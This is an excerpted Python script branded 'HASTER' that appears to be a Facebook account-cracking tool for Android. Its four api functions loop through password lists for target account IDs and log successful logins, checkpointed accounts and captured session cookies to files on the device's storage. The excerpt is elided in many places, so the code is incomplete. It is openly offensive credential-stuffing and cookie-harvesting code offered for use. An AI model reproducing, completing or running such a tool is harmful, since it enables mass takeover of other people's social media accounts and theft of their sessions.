...
db   db  .d8b.  .d8888. d888888b d88888b d8888b. 
88   88 d8' `8b 88'  YP `~~88~~' 88'     88  `8D 
88ooo88 88ooo88 `8bo.      88    88ooooo 88oobY' 
88~~~88 88~~~88   `Y8b.    88    88~~~~~ 88`8b   
88   88 88   88 db   8D    88    88.     88 `88. 
YP   YP YP   YP `8888Y'    YP    Y88888P 88   YD 
                                            
\033[1;37m -----------------------⚔️------------------------
    
       \033[1;37mAUTHOR    🔰HASTER📌
       \033[1;37mFacebook  🔰SHOBI📌
...
def menu():
		...
		#	linex()
			...
			if xd in ['1','01']:
				...
				os.system('xdg-open https://wa.me/+92*********?text=')
				menu()
			elif xd in ['0','00']:
				exit(' 😍')
			else:
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [HASTER-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [HASTER-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/HASTER-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [HASTER-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/HASTER-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/HASTER-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [HASTER-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/HASTER-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HASTER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HASTER-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HASTER-M3] %s|\033[1;37mOK:-%s \033[1;34m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/HUXII/HASTER-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/HUXII/HASTER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HASTER-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [HASTER-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HASTER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
